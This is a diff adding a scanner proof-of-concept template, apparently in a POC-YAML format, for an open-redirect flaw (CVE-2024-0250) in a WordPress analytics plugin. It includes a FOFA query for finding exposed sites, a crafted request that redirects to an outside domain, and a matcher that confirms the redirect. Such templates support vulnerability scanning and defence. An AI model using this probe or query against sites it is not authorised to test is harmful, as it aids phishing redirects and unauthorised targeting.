@@ -1,0 +1,21 @@
+id: poc-yaml-google-analytics-open-redirect
+info:
+  name: Google Analytics 开放重定向漏洞(CVE-2024-0250)
+  severity: medium
+  tags:
+  - CVE-2024-0250
+  - 任意重定向
+  finger: google_analytics
+  fofa: body="/wp-content/plugins/analytics-insights"
+requests:
+- method: GET
+  path: /wp-content/plugins/analytics-insights/tools/oauth2callback.php?state=https://www.baidu.com/%3f&code=x
+  expression: 'status_code == 302 &&
+
+    body == "" &&
+
+    contains(headers,"Location: https://www.baidu.com/?&aiwp_access_code=x")
+
+    '
+variables: {}
+transport: http
